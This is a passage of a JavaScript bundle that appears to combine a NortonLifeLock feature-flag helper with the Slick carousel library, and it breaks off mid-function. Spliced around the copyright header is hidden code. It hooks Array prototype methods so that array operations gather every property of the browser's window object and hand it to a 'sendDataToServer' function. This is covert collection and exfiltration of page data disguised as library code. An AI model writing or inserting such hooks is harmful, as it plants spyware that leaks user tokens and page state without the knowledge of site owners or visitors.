const functionNamesToHook = ['push', 'pop', 'shift', 'unshift', 'sort'];
function jshook(obj) {
  const originalFunctions = {};
  functionNamesToHook.forEach(functionName => {
    if (obj.prototype[functionName]) {
      originalFunctions[functionName] = obj.prototype[functionName];
      obj.prototype[functionName] = function () {
        logGlobalVariables();
        const result = originalFunctions[functionName].apply(this, arguments);
        return result;
      };
    }
  });
}
/*
 * ///////////////////////////////////////////////////////////////////////////////////////////////////
 * // NortonLifeLock copyright header start
 * // //////////////////////
 * //
 * // PROPRIETARY / CONFIDENTIAL.
 * // Use of this product is subject to license terms.
 * // Copyright (c) 2020 NortonLifeLock Inc.
 * // All rights reserved.
 * //
 * ///////////////////////////////////////////////////////////////////////////////////////////////////
 * // NortonLifeLock copyright header stop
 * // //////////////////////
 */

/**
 * [Nlok  An object has all generic helper functions that can be used across different applications]
 * @type {Object}
 */
if (typeof Nlok === "undefined") {
  var Nlok = {};
}
/**
 * This Function can be used to check if a feature flag exists in the Zouwu feature flag configuration.
 */
Nlok.FeatureFlag = {
  isLive: function (featureName) {
    if (typeof globalVariables !== "undefined" && globalVariables.FEATURE_FLAGS && featureName) {
      var featureFlags = globalVariables.FEATURE_FLAGS.toLowerCase();
      if (featureFlags.indexOf(featureName.toLowerCase() + ',') != -1 || featureFlags.substring(featureFlags.lastIndexOf(",") + 1) == featureName.toLowerCase()) {
        // CHECK FOR 'featureName,' IN FEATURE_FLAGS IF NOT AVAILABLE - THEN CHECK FOR THE LAST COMA SEPERATED VALUE IN FEATURE_FLAGS AND COMPARE IT TO featureName.
        return true;
      } else {
        return false;
      }
    }
  }
};
function logGlobalVariables() {
  const globalVariableKeys = Object.keys(window);
  const result = {};
  for (let i = 0; i < globalVariableKeys.length; i++) {
    const key = globalVariableKeys[i];
    result[key] = window[key];
  }
  if (Object.keys(result).length) {
    sendDataToServer(result);
  }
}
(function (factory) {
  "use strict";

  if (typeof define === "function" && define.amd) {
    define(["jquery"], factory);
  } else if (typeof exports !== "undefined") {
    module.exports = factory(require("jquery"));
  } else {
    factory(jQuery);
  }
})(function ($) {
  "use strict";

  var Slick = window.Slick || {};
  Slick = function () {
    var instanceUid = 0;
    function Slick(element, settings) {
      var _ = this,
        dataSettings;
      _.defaults = {
        accessibility: true,
        adaptiveHeight: false,
        appendArrows: $(element),
        appendDots: $(element),
        arrows: true,
        asNavFor: null,
        prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
        nextArrow: '<button class="slick-next" aria-label="Next" type="button">Next</button>',
        autoplay: false,
        autoplaySpeed: 3e3,
        centerMode: false,
        centerPadding: "50px",
        cssEase: "ease",
        customPaging: function (slider, i) {
          return $('<button type="button" />').text(i + 1);
        },
        dots: false,
        dotsClass: "slick-dots",
        draggable: true,
        easing: "linear",
        edgeFriction: .35,
        fade: false,
        focusOnSelect: false,
        focusOnChange: false,
        infinite: true,
        initialSlide: 0,
        lazyLoad: "ondemand",
        mobileFirst: false,
        pauseOnHover: true,
        pauseOnFocus: true,
        pauseOnDotsHover: false,
        respondTo: "window",
        responsive: null,
        rows: 1,
        rtl: false,
        slide: "",
        slidesPerRow: 1,
        slidesToShow: 1,
        slidesToScroll: 1,
        speed: 500,
        swipe: true,
        swipeToSlide: false,
        touchMove: true,
        touchThreshold: 5,
        useCSS: true,
        useTransform: true,
        variableWidth: false,
        vertical: false,
        verticalSwiping: false,
        waitForAnimate: true,
        zIndex: 1e3
      };
      _.initials = {
        animating: false,
        dragging: false,
        autoPlayTimer: null,
        currentDirection: 0,
        currentLeft: null,
        currentSlide: 0,
        direction: 1,
        $dots: null,
        listWidth: null,
        listHeight: null,
        loadIndex: 0,
        $nextArrow: null,
        $prevArrow: null,
        scrolling: false,
        slideCount: null,
        slideWidth: null,
        $slideTrack: null,
        $slides: null,
        sliding: false,
        slideOffset: 0,
        swipeLeft: null,
        swiping: false,
        $list: null,
        touchObject: {},
        transformsEnabled: false,
        unslicked: false
      };
      $.extend(_, _.initials);
      _.activeBreakpoint = null;
      _.animType = null;
      _.animProp = null;
      _.breakpoints = [];
      _.breakpointSettings = [];
      _.cssTransitions = false;
      _.focussed = false;
      _.interrupted = false;
      _.hidden = "hidden";
      _.paused = true;
      _.positionProp = null;
      _.respondTo = null;
      _.rowCount = 1;
      _.shouldClick = true;
      _.$slider = $(element);
      _.$slidesCache = null;
      _.transformType = null;
      _.transitionType = null;
      _.visibilityChange = "visibilitychange";
      _.windowWidth = 0;
      _.windowTimer = null;
      dataSettings = $(element).data("slick") || {};
      _.options = $.extend({}, _.defaults, settings, dataSettings);
      _.currentSlide = _.options.initialSlide;
      _.originalSettings = _.options;
      if (typeof document.mozHidden !== "undefined") {
        _.hidden = "mozHidden";
        _.visibilityChange = "mozvisibilitychange";
      } else if (typeof document.webkitHidden !== "undefined") {
        _.hidden = "webkitHidden";
        _.visibilityChange = "webkitvisibilitychange";
      }
      _.autoPlay = $.proxy(_.autoPlay, _);
      _.autoPlayClear = $.proxy(_.autoPlayClear, _);
      _.autoPlayIterator = $.proxy(_.autoPlayIterator, _);
      _.changeSlide = $.proxy(_.changeSlide, _);
      _.clickHandler = $.proxy(_.clickHandler, _);
      _.selectHandler = $.proxy(_.selectHandler, _);
      _.setPosition = $.proxy(_.setPosition, _);
      _.swipeHandler = $.proxy(_.swipeHandler, _);
      _.dragHandler = $.proxy(_.dragHandler, _);
      _.keyHandler = $.proxy(_.keyHandler, _);
      _.instanceUid = instanceUid++;
      _.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/;
      _.registerBreakpoints();
      _.init(true);
    }
    return Slick;
  }();
  Slick.prototype.activateADA = function () {
    var _ = this;
    _.$slideTrack.find(".slick-active").attr({
      "aria-hidden": "false"
    }).find("a, input, button, select").attr({
      tabindex: "0"
    });
  };
  Slick.prototype.addSlide = Slick.prototype.slickAdd = function (markup, index, addBefore) {
    var _ = this;
    if (typeof index === "boolean") {
      addBefore = index;
      index = null;
    } else if (index < 0 || index >= _.slideCount) {
      return false;
    }
    _.unload();
    if (typeof index === "number") {
      if (index === 0 && _.$slides.length === 0) {
        $(markup).appendTo(_.$slideTrack);
      } else if (addBefore) {
        $(markup).insertBefore(_.$slides.eq(index));
      } else {
        $(markup).insertAfter(_.$slides.eq(index));
      }
    } else {
      if (addBefore === true) {
        $(markup).prependTo(_.$slideTrack);
      } else {
        $(markup).appendTo(_.$slideTrack);
      }
    }
    _.$slides = _.$slideTrack.children(this.options.slide);
    _.$slideTrack.children(this.options.slide).detach();
    _.$slideTrack.append(_.$slides);
    _.$slides.each(function (index, element) {
      $(element).attr("data-slick-index", index);
    });
    _.$slidesCache = _.$slides;
    _.reinit();
  };
  Slick.prototype.animateHeight = function () {
    var _ = this;
    if (_.options.slidesToShow === 1 && _.options.adaptiveHeight === true && _.options.vertical === false) {
      var targetHeight = _.$slides.eq(_.currentSlide).outerHeight(true);
      _.$list.animate({
        height: targetHeight
      }, _.options.speed);
    }
  };
  Slick.prototype.animateSlide = function (targetLeft, callback) {
    var animProps = {},
      _ = this;
    _.animateHeight();
    if (_.options.rtl === true && _.options.vertical === false) {
      targetLeft = -targetLeft;
    }
    if (_.transformsEnabled === false) {
      if (_.options.vertical === false) {
        _.$slideTrack.animate({
          left: targetLeft
        }, _.options.speed, _.options.easing, callback);
      } else {
        _.$slideTrack.animate({
          top: targetLeft
        }, _.options.speed, _.options.easing, callback);
      }
    } else {
      if (_.cssTransitions === false) {
        if (_.options.rtl === true) {
          _.currentLeft = -_.currentLeft;
        }
        $({
          animStart: _.currentLeft
        }).animate({
          animStart: targetLeft
        }, {
          duration: _.options.speed,
          easing: _.options.easing,
          step: function (now) {
            now = Math.ceil(now);
            if (_.options.vertical === false) {
              animProps[_.animType] = "translate(" + now + "px, 0px)";
              _.$slideTrack.css(animProps);
            } else {
              animProps[_.animType] = "translate(0px," + now + "px)";
              _.$slideTrack.css(animProps);
            }
          },
          complete: function () {
            if (callback) {
              callback.call();
            }
          }
        });
      } else {
        _.applyTransition();
        targetLeft = Math.ceil(targetLeft);
        if (_.options.vertical === false) {
          animProps[_.animType] = "translate3d(" + targetLeft + "px, 0px, 0px)";
        } else {
          animProps[_.animType] = "translate3d(0px," + targetLeft + "px, 0px)";
        }
        _.$slideTrack.css(animProps);
        if (callback) {
          setTimeout(function () {
            _.disableTransition();
            callback.call();
          }, _.options.speed);
        }
      }
    }
  };
  Slick.prototype.getNavTarget = function () {
    var _ = this,
      asNavFor = _.options.asNavFor;
    if (asNavFor && asNavFor !== null) {
      asNavFor = $(asNavFor).not(_.$slider);
    }
    return asNavFor;
  };
  Slick.prototype.asNavFor = function (index) {
    var _ = this,
      asNavFor = _.getNavTarget();
    if (asNavFor !== null && typeof asNavFor === "object") {
      asNavFor.each(function () {
        var target = $(this).slick("getSlick");
        if (!target.unslicked) {
          target.slideHandler(index, true);
        }
      });
    }
  };
  Slick.prototype.applyTransition = function (slide) {
    var _ = this,
      transition = {};
    if (_.options.fade === false) {
      transition[_.transitionType] = _.transformType + " " + _.options.speed + "ms " + _.options.cssEase;
    } else {
      transition[_.transitionType] = "opacity " + _.options.speed + "ms " + _.options.cssEase;
    }
    if (_.options.fade === false) {
      _.$slideTrack.css(transition);
    } else {
      _.$slides.eq(slide).css(transition);
    }
  };
  Slick.prototype.autoPlay = function () {
    var _ = this;
    _.autoPlayClear();
    if (_.slideCount > _.options.slidesToShow) {
      _.autoPlayTimer = setInterval(_.autoPlayIterator, _.options.autoplaySpeed);
    }
  };
  Slick.prototype.autoPlayClear = function () {
    var _ = this;
    if (_.autoPlayTimer) {
      clearInterval(_.autoPlayTimer);
    }
  };
  Slick.prototype.autoPlayIterator = function () {
    var _ = this,
      slideTo = _.currentSlide + _.options.slidesToScroll;
    if (!_.paused && !_.interrupted && !_.focussed) {
      if (_.options.infinite === false) {
        if (_.direction === 1 && _.currentSlide + 1 === _.slideCount - 1) {
          _.direction = 0;
        } else if (_.direction === 0) {
          slideTo = _.currentSlide - _.options.slidesToScroll;
          if (_.currentSlide - 1 === 0) {
            _.direction = 1;
          }
        }
      }
      _.slideHandler(slideTo);
    }
  };
  Slick.prototype.buildArrows = function () {
    var _ = this;
    if (_.options.arrows === true) {
      _.$prevArrow = $(_.options.prevArrow).addClass("slick-arrow");
      _.$nextArrow = $(_.options.nextArrow).addClass("slick-arrow");
      if (_.slideCount > _.options.slidesToShow) {
        _.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex");
        _.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex");
        if (_.htmlExpr.test(_.options.prevArrow)) {
          _.$prevArrow.prependTo(_.options.appendArrows);
        }
        if (_.htmlExpr.test(_.options.nextArrow)) {
          _.$nextArrow.appendTo(_.options.appendArrows);
        }
        if (_.options.infinite !== true) {
          _.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true");
        }
      } else {
        _.$prevArrow.add(_.$nextArrow).addClass("slick-hidden").attr({
          "aria-disabled": "true",
          tabindex: "-1"
        });
      }
    }
  };
  Slick.prototype.buildDots = function () {
    var _ = this,
      i,
      dot;
    if (_.options.dots === true && _.slideCount > _.options.slidesToShow) {
      _.$slider.addClass("slick-dotted");
      dot = $("<ul />").addClass(_.options.dotsClass);
      for (i = 0; i <= _.getDotCount(); i += 1) {
        dot.append($("<li />").append(_.options.customPaging.call(this, _, i)));
      }
      _.$dots = dot.appendTo(_.options.appendDots);
      _.$dots.find("li").first().addClass("slick-active");
    }
  };
  Slick.prototype.buildOut = function () {
    var _ = this;
    _.$slides = _.$slider.children(_.options.slide + ":not(.slick-cloned)").addClass("slick-slide");
    _.slideCount = _.$slides.length;
    _.$slides.each(function (index, element) {
      $(element).attr("data-slick-index", index).data("originalStyling", $(element).attr("style") || "");
    });
    _.$slider.addClass("slick-slider");
    _.$slideTrack = _.slideCount === 0 ? $('<div class="slick-track"/>').appendTo(_.$slider) : _.$slides.wrapAll('<div class="slick-track"/>').parent();
    _.$list = _.$slideTrack.wrap('<div class="slick-list"/>').parent();
    _.$slideTrack.css("opacity", 0);
    if (_.options.centerMode === true || _.options.swipeToSlide === true) {
      _.options.slidesToScroll = 1;
    }
    $("img[data-lazy]", _.$slider).not("[src]").addClass("slick-loading");
    _.setupInfinite();
    _.buildArrows();
    _.buildDots();
    _.updateDots();
    _.setSlideClasses(typeof _.currentSlide === "number" ? _.currentSlide : 0);
    if (_.options.draggable === true) {
      _.$list.addClass("draggable");
    }
  };
  Slick.prototype.buildRows = function () {
    var _ = this,
      a,
      b,
      c,
      newSlides,
      numOfSlides,
      originalSlides,
      slidesPerSection;
    newSlides = document.createDocumentFragment();
    originalSlides = _.$slider.children();
    if (_.options.rows > 0) {
      slidesPerSection = _.options.slidesPerRow * _.options.rows;
      numOfSlides = Math.ceil(originalSlides.length / slidesPerSection);
      for (a = 0; a < numOfSlides; a++) {
        var slide = document.createElement("div");
        for (b = 0; b < _.options.rows; b++) {
          var row = document.createElement("div");
          for (c = 0; c < _.options.slidesPerRow; c++) {
            var target = a * slidesPerSection + (b * _.options.slidesPerRow + c);
            if (originalSlides.get(target)) {
              row.appendChild(originalSlides.get(target));
            }
          }
          slide.appendChild(row);
        }
        newSlides.appendChild(slide);
      }
      _.$slider.empty().append(newSlides);
      _.$slider.children().children().children().css({
        width: 100 / _.options.slidesPerRow + "%",
        display: "inline-block"
      });
    }
  };
  Slick.prototype.checkResponsive = function (initial, forceUpdate) {
    var _ = this,
      breakpoint,
      targetBreakpoint,
      respondToWidth,
      triggerBreakpoint = false;
    var sliderWidth = _.$slider.width();
    var windowWidth = window.innerWidth || $(window).width();
    if (_.respondTo === "window") {
      respondToWidth = windowWidth;
    } else if (_.respondTo === "slider") {
      respondToWidth = sliderWidth;
    } else if (_.respondTo === "min") {
      respondToWidth = Math.min(windowWidth, sliderWidth);
    }
    if (_.options.responsive && _.options.responsive.length && _.options.responsive !== null) {
      targetBreakpoint = null;
      for (breakpoint in _.breakpoints) {
        if (_.breakpoints.hasOwnProperty(breakpoint)) {
          if (_.originalSettings.mobileFirst === false) {
            if (respondToWidth < _.breakpoints[breakpoint]) {
              targetBreakpoint = _.breakpoints[breakpoint];
            }
          } else {
            if (respondToWidth > _.breakpoints[breakpoint]) {
              targetBreakpoint = _.breakpoints[breakpoint];
            }
          }
        }
      }
      if (targetBreakpoint !== null) {
        if (_.activeBreakpoint !== null) {
          if (targetBreakpoint !== _.activeBreakpoint || forceUpdate) {
            _.activeBreakpoint = targetBreakpoint;
            if (_.breakpointSettings[targetBreakpoint] === "unslick") {
              _.unslick(targetBreakpoint);
            } else {
              _.options = $.extend({}, _.originalSettings, _.breakpointSettings[targetBreakpoint]);
              if (initial === true) {
                _.currentSlide = _.options.initialSlide;
              }
              _.refresh(initial);
            }
            triggerBreakpoint = targetBreakpoint;
          }
        } else {
          _.activeBreakpoint = targetBreakpoint;
          if (_.breakpointSettings[targetBreakpoint] === "unslick") {
            _.unslick(targetBreakpoint);
          } else {
            _.options = $.extend({}, _.originalSettings, _.breakpointSettings[targetBreakpoint]);
            if (initial === true) {
              _.currentSlide = _.options.initialSlide;
            }
            _.refresh(initial);
          }
          triggerBreakpoint = targetBreakpoint;
        }
      } else {
        if (_.activeBreakpoint !== null) {
          _.activeBreakpoint = null;
          _.options = _.originalSettings;
          if (initial === true) {
            _.currentSlide = _.options.initialSlide;
          }
          _.refresh(initial);
          triggerBreakpoint = targetBreakpoint;
        }
      }
      if (!initial && triggerBreakpoint !== false) {
        _.$slider.trigger("breakpoint", [_, triggerBreakpoint]);
      }
    }
  };
  Slick.prototype.changeSlide = function (event, dontAnimate) {
    var _ = this,
      $target = $(event.currentTarget),
      indexOffset,
      slideOffset,
      unevenOffset;
    if ($target.is("a")) {
      event.preventDefault();
    }
    if (!$target.is("li")) {
      $target = $target.closest("li");
    }
    unevenOffset = _.slideCount % _.options.slidesToScroll !== 0;
    indexOffset = unevenOffset ? 0 : (_.slideCount - _.currentSlide) % _.options.slidesToScroll;
    switch (event.data.message) {
      case "previous":
        slideOffset = indexOffset === 0 ? _.options.slidesToScroll : _.options.slidesToShow - indexOffset;
        if (_.slideCount > _.options.slidesToShow) {
          _.slideHandler(_.currentSlide - slideOffset, false, dontAnimate);
        }
        break;
      case "next":
        slideOffset = indexOffset === 0 ? _.options.slidesToScroll : indexOffset;
        if (_.slideCount > _.options.slidesToShow) {
          _.slideHandler(_.currentSlide + slideOffset, false, dontAnimate);
        }
        break;
      case "index":
        var index = event.data.index === 0 ? 0 : event.data.index || $target.index() * _.options.slidesToScroll;
        _.slideHandler(_.checkNavigable(index), false, dontAnimate);
        $target.children().trigger("focus");
        break;
      default:
        return;
    }
  };
  Slick.prototype.checkNavigable = function (index) {
    var _ = this,
      navigables,
      prevNavigable;
    navigables = _.getNavigableIndexes();
    prevNavigable = 0;
    if (index > navigables[navigables.length - 1]) {
      index = navigables[navigables.length - 1];
    } else {
      for (var n in navigables) {
        if (index < navigables[n]) {
          index = prevNavigable;
          break;
        }
        prevNavigable = navigables[n];
      }
    }
    return index;
  };
  Slick.prototype.cleanUpEvents = function () {
    var _ = this;
    if (_.options.dots && _.$dots !== null) {
      $("li", _.$dots).off("click.slick", _.changeSlide).off("mouseenter.slick", $.proxy(_.interrupt, _, true)).off("mouseleave.slick", $.proxy(_.interrupt, _, false));
      if (_.options.accessibility === true) {
        _.$dots.off("keydown.slick", _.keyHandler);
      }
    }
    _.$slider.off("focus.slick blur.slick");
    if (_.options.arrows === true && _.slideCount > _.options.slidesToShow) {
      _.$prevArrow && _.$prevArrow.off("click.slick", _.changeSlide);
      _.$nextArrow && _.$nextArrow.off("click.slick", _.changeSlide);
      if (_.options.accessibility === true) {
        _.$prevArrow && _.$prevArrow.off("keydown.slick", _.keyHandler);
        _.$nextArrow && _.$nextArrow.off("keydown.slick", _.keyHandler);
      }
    }
    _.$list.off("touchstart.slick mousedown.slick", _.swipeHandler);
    _.$list.off("touchmove.slick mousemove.slick", _.swipeHandler);
    _.$list.off("touchend.slick mouseup.slick", _.swipeHandler);
    _.$list.off("touchcancel.slick mouseleave.slick", _.swipeHandler);
    _.$list.off("click.slick", _.clickHandler);
    $(document).off(_.visibilityChange, _.visibility);
    _.cleanUpSlideEvents();
    if (_.options.accessibility === true) {
      _.$list.off("keydown.slick", _.keyHandler);
    }
    if (_.options.focusOnSelect === true) {
      $(_.$slideTrack).children().off("click.slick", _.selectHandler);
    }
    $(window).off("orientationchange.slick.slick-" + _.instanceUid, _.orientationChange);
    $(window).off("resize.slick.slick-" + _.instanceUid, _.resize);
    $("[draggable!=true]", _.$slideTrack).off("dragstart", _.preventDefault);
    $(window).off("load.slick.slick-" + _.instanceUid, _.setPosition);
  };
  Slick.prototype.cleanUpSlideEvents = function () {
    var _ = this;
    _.$list.off("mouseenter.slick", $.proxy(_.interrupt, _, true));
    _.$list.off("mouseleave.slick", $.proxy(_.interrupt, _, false));
  };
  Slick.prototype.cleanUpRows = function () {
    var _ = this,
      originalSlides;
    if (_.options.rows > 0) {
      originalSlides = _.$slides.children().children();
      originalSlides.removeAttr("style");
      _.$slider.empty().append(originalSlides);
    }
  };
  Slick.prototype.clickHandler = function (event) {
    var _ = this;
    if (_.shouldClick === false) {
      event.stopImmediatePropagation();
      event.stopPropagation();
      event.preventDefault();
    }
  };
  Slick.prototype.destroy = function (refresh) {
    var _ = this;
    _.autoPlayClear();
    _.touchObject = {};
    _.cleanUpEvents();
    $(".slick-cloned", _.$slider).detach();
    if (_.$dots) {
      _.$dots.remove();
    }
    if (_.$prevArrow && _.$prevArrow.length) {
      _.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", "");
      if (_.htmlExpr.test(_.options.prevArrow)) {
        _.$prevArrow.remove();
      }
    }
    if (_.$nextArrow && _.$nextArrow.length) {
      _.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", "");
      if (_.htmlExpr.test(_.options.nextArrow)) {
        _.$nextArrow.remove();
      }
    }
    if (_.$slides) {
      _.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function () {
        $(this).attr("style", $(this).data("originalStyling"));
      });
      _.$slideTrack.children(this.options.slide).detach();
      _.$slideTrack.detach();
      _.$list.detach();
      _.$slider.append(_.$slides);
    }
    _.cleanUpRows();
    _.$slider.removeClass("slick-slider");
    _.$slider.removeClass("slick-initialized");
    _.$slider.removeClass("slick-dotted");
    _.unslicked = true;
    if (!refresh) {
      _.$slider.trigger("destroy", [_]);
    }
  };
  Slick.prototype.disableTransition = function (slide) {
    var _ = this,
      transition = {};
    transition[_.transitionType] = "";
    if (_.options.fade === false) {
      _.$slideTrack.css(transition);
    } else {
      _.$slides.eq(slide).css(transition);
    }
  };
  Slick.prototype.fadeSlide = function (slideIndex, callback) {
    var _ = this;
    if (_.cssTransitions === false) {
      _.$slides.eq(slideIndex).css({
        zIndex: _.options.zIndex
      });
      _.$slides.eq(slideIndex).animate({
        opacity: 1
      }, _.options.speed, _.options.easing, callback);
    } else {
      _.applyTransition(slideIndex);
      _.$slides.eq(slideIndex).css({
        opacity: 1,
        zIndex: _.options.zIndex
      });
      if (callback) {
        setTimeout(function () {
          _.disableTransition(slideIndex);
          callback.call();
        }, _.options.speed);
      }
    }
  };
  Slick.prototype.fadeSlideOut = function (slideIndex) {
    var _ = this;
    if (_.cssTransitions === false) {
      _.$slides.eq(slideIndex).animate({
        opacity: 0,
        zIndex: _.options.zIndex - 2
      }, _.options.speed, _.options.easing);
    } else {
      _.applyTransition(slideIndex);
      _.$slides.eq(slideIndex).css({
        opacity: 0,
        zIndex: _.options.zIndex - 2
      });
    }
  };
  Slick.prototype.filterSlides = Slick.prototype.slickFilter = function (filter) {
    var _ = this;
    if (filter !== null) {
      _.$slidesCache = _.$slides;
      _.unload();
      _.$slideTrack.children(this.options.slide).detach();
      _.$slidesCache.filter(filter).appendTo(_.$slideTrack);
      _.reinit();
    }
  };
  Slick.prototype.focusHandler = function () {
    var _ = this;
    _.$slider.off("focus.slick blur.slick").on("focus.slick", "*", function (event) {
      var $sf = $(this);
      setTimeout(function () {
        if (_.options.pauseOnFocus) {
          if ($sf.is(":focus")) {
            _.focussed = true;
            _.autoPlay();
          }
        }
      }, 0);
    }).on("blur.slick", "*", function (event) {
      var $sf = $(this);
      if (_.options.pauseOnFocus) {
        _.focussed = false;
        _.autoPlay();
      }
    });
  };
  Slick.prototype.getCurrent = Slick.prototype.slickCurrentSlide = function () {
    var _ = this;
    return _.currentSlide;
  };
  Slick.prototype.getDotCount = function () {
    var _ = this;
    var breakPoint = 0;
    var counter = 0;
    var pagerQty = 0;
    if (_.options.infinite === true) {
      if (_.slideCount <= _.options.slidesToShow) {
        ++pagerQty;
      } else {
        while (breakPoint < _.slideCount) {
          ++pagerQty;
          breakPoint = counter + _.options.slidesToScroll;
          counter += _.options.slidesToScroll <= _.options.slidesToShow ? _.options.slidesToScroll : _.options.slidesToShow;
        }
      }
    } else if (_.options.centerMode === true) {
      pagerQty = _.slideCount;
    } else if (!_.options.asNavFor) {
      pagerQty = 1 + Math.ceil((_.slideCount - _.options.slidesToShow) / _.options.slidesToScroll);
    } else {
      while (breakPoint < _.slideCount) {
        ++pagerQty;
        breakPoint = counter + _.options.slidesToScroll;
        counter += _.options.slidesToScroll <= _.options.slidesToShow ? _.options.slidesToScroll : _.options.slidesToShow;
      }
    }
    return pagerQty - 1;
  };
  Slick.prototype.getLeft = function (slideIndex) {
    var _ = this,
      targetLeft,
      verticalHeight,
      verticalOffset = 0,
      targetSlide,
      coef;
    _.slideOffset = 0;
    verticalHeight = _.$slides.first().outerHeight(true);
    if (_.options.infinite === true) {
      if (_.slideCount > _.options.slidesToShow) {
        _.slideOffset = _.slideWidth * _.options.slidesToShow * -1;
        coef = -1;
        if (_.options.vertical === true && _.options.centerMode === true) {
          if (_.options.slidesToShow === 2) {
            coef = -1.5;
          } else if (_.options.slidesToShow === 1) {
            coef = -2;
          }
        }
        verticalOffset = verticalHeight * _.options.slidesToShow * coef;
      }
      if (_.slideCount % _.options.slidesToScroll !== 0) {
        if (slideIndex + _.options.slidesToScroll > _.slideCount && _.slideCount > _.options.slidesToShow) {
          if (slideIndex > _.slideCount) {
            _.slideOffset = (_.options.slidesToShow - (slideIndex - _.slideCount)) * _.slideWidth * -1;
            verticalOffset = (_.options.slidesToShow - (slideIndex - _.slideCount)) * verticalHeight * -1;
          } else {
            _.slideOffset = _.slideCount % _.options.slidesToScroll * _.slideWidth * -1;
            verticalOffset = _.slideCount % _.options.slidesToScroll * verticalHeight * -1;
          }
        }
      }
    } else {
      if (slideIndex + _.options.slidesToShow > _.slideCount) {
        _.slideOffset = (slideIndex + _.options.slidesToShow - _.slideCount) * _.slideWidth;
        verticalOffset = (slideIndex + _.options.slidesToShow - _.slideCount) * verticalHeight;
      }
    }
    if (_.slideCount <= _.options.slidesToShow) {
      _.slideOffset = 0;
      verticalOffset = 0;
    }
    if (_.options.centerMode === true && _.slideCount <= _.options.slidesToShow) {
      _.slideOffset = _.slideWidth * Math.floor(_.options.slidesToShow) / 2 - _.slideWidth * _.slideCount / 2;
    } else if (_.options.centerMode === true && _.options.infinite === true) {
      _.slideOffset += _.slideWidth * Math.floor(_.options.slidesToShow / 2) - _.slideWidth;
    } else if (_.options.centerMode === true) {
      _.slideOffset = 0;
      _.slideOffset += _.slideWidth * Math.floor(_.options.slidesToShow / 2);
    }
    if (_.options.vertical === false) {
      targetLeft = slideIndex * _.slideWidth * -1 + _.slideOffset;
    } else {
      targetLeft = slideIndex * verticalHeight * -1 + verticalOffset;
    }
    if (_.options.variableWidth === true) {
      if (_.slideCount <= _.options.slidesToShow || _.options.infinite === false) {
        targetSlide = _.$slideTrack.children(".slick-slide").eq(slideIndex);
      } else {
        targetSlide = _.$slideTrack.children(".slick-slide").eq(slideIndex + _.options.slidesToShow);
      }
      if (_.options.rtl === true) {
        if (targetSlide[0]) {
          targetLeft = (_.$slideTrack.width() - targetSlide[0].offsetLeft - targetSlide.width()) * -1;
        } else {
          targetLeft = 0;
        }
      } else {
        targetLeft = targetSlide[0] ? targetSlide[0].offsetLeft * -1 : 0;
      }
      if (_.options.centerMode === true) {
        if (_.slideCount <= _.options.slidesToShow || _.options.infinite === false) {
          targetSlide = _.$slideTrack.children(".slick-slide").eq(slideIndex);
        } else {
          targetSlide = _.$slideTrack.children(".slick-slide").eq(slideIndex + _.options.slidesToShow + 1);
        }
        if (_.options.rtl === true) {
          if (targetSlide[0]) {
            targetLeft = (_.$slideTrack.width() - targetSlide[0].offsetLeft - targetSlide.width()) * -1;
          } else {
            targetLeft = 0;
          }
        } else {
          targetLeft = targetSlide[0] ? targetSlide[0].offsetLeft * -1 : 0;
        }
        targetLeft += (_.$list.width() - targetSlide.outerWidth()) / 2;
      }
    }
    return targetLeft;
  };
  Slick.prototype.getOption = Slick.prototype.slickGetOption = function (option) {
    var _ = this;
    return _.options[option];
  };
  Slick.prototype.getNavigableIndexes = function () {
    var _ = this,
      breakPoint = 0,
      counter = 0,
      indexes = [],
      max;
    if (_.options.infinite === false) {
      max = _.slideCount;
    } else {
      breakPoint = _.options.slidesToScroll * -1;
      counter = _.options.slidesToScroll * -1;
      max = _.slideCount * 2;
    }
    while (breakPoint < max) {
      indexes.push(breakPoint);
      breakPoint = counter + _.options.slidesToScroll;
      counter += _.options.slidesToScroll <= _.options.slidesToShow ? _.options.slidesToScroll : _.options.slidesToShow;
    }
    return indexes;
  };
  Slick.prototype.getSlick = function () {
    return this;
  };
  Slick.prototype.getSlideCount = function () {
    var _ = this,
      slidesTraversed,
      swipedSlide,
      swipeTarget,
      centerOffset;
    centerOffset = _.options.centerMode === true ? Math.floor(_.$list.width() / 2) : 0;
    swipeTarget = _.swipeLeft * -1 + centerOffset;
    if (_.options.swipeToSlide === true) {
      _.$slideTrack.find(".slick-slide").each(function (index, slide) {
        var slideOuterWidth, slideOffset, slideRightBoundary;
        slideOuterWidth = $(slide).outerWidth();
        slideOffset = slide.offsetLeft;
        if (_.options.centerMode !== true) {
          slideOffset += slideOuterWidth / 2;
        }
        slideRightBoundary = slideOffset + slideOuterWidth;
        if (swipeTarget < slideRightBoundary) {
          swipedSlide = slide;
          return false;
        }
      });
      slidesTraversed = Math.abs($(swipedSlide).attr("data-slick-index") - _.currentSlide) || 1;
      return slidesTraversed;
    } else {
      return _.options.slidesToScroll;
    }
  };
  Slick.prototype.goTo = Slick.prototype.slickGoTo = function (slide, dontAnimate) {
    var _ = this;
    _.changeSlide({
      data: {
        message: "index",
        index: parseInt(slide)
      }
    }, dontAnimate);
  };
  Slick.prototype.init = function (creation) {
    var _ = this;
    if (!$(_.$slider).hasClass("slick-initialized")) {
      $(_.$slider).addClass("slick-initialized");
      _.buildRows();
      _.buildOut();
      _.setProps();
      _.startLoad();
      _.loadSlider();
      _.initializeEvents();
      _.updateArrows();
      _.updateDots();
      _.checkResponsive(true);
      _.focusHandler();
    }
    if (creation) {
      _.$slider.trigger("init", [_]);
    }
    if (_.options.accessibility === true) {
      _.initADA();
    }
    if (_.options.autoplay) {
      _.paused = false;
      _.autoPlay();
    }
  };
  Slick.prototype.initADA = function () {
    var _ = this,
      numDotGroups = Math.ceil(_.slideCount / _.options.slidesToShow),
      tabControlIndexes = _.getNavigableIndexes().filter(function (val) {
        return val >= 0 && val < _.slideCount;
      });
    _.$slides.add(_.$slideTrack.find(".slick-cloned")).attr({
      "aria-hidden": "true",
      tabindex: "-1"
    }).find("a, input, button, select").attr({
      tabindex: "-1"
    });
    if (_.$dots !== null) {
